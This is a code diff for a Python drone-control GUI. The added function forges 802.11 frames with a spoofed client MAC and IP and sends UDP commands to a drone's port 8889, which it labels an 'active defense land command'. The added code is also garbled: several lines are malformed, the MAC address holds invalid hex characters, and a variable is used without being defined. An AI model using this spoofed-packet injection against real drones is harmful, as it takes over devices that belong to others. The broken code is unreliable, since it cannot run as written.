@@ -27,8 +27,34 @@ def load_drone_json(filepath='drones.json'):
     except json.JSONDecodeError:
         status_label.configure(text=f'Wrong file format. It should be json file')
 
+
 target_mac=.get("mac_address")
 iface-profile.get("interface","wlan0") 
+
+fake_client_mac = "00:AB:CD:EF:GH:IJ" 
+fake_client_ip = "192.168.10.2"
+
+status_label.configure(text=f"\n Will send active defense land command")
+
+def send_scapy_cmd(cmd_str):
+    profiles=load_drone_json()   
+    if drone_model is None:
+        status_label.configure(text="Please provide drone_model in the json config file.")
+        return
+    
+    # drone_model is absent in the json config file.
+    if drone_model not in profiles:
+        status_label.configure(f'Cannot find drone_model in json config file.')
+        return
+    
+    profile=profiles[drone_model]
+    dot11 = Dot11(type=2, subtype=0, addr1=target_mac, addr2=fake_client_mac, addr3=target_mac)
+    
+    pkt = RadioTap() / dot11 / LLC() / SNAP() / IP(src=fake_client_ip, dst=target_ip) / UDP(sport=8889, dport=target_port) / cmd_str
+        
+    sendp(pkt, iface=iface, verbose=False)
+
+
     try:
         if profile.get("initial_command"):
             status_label.configure(text="send intial command")
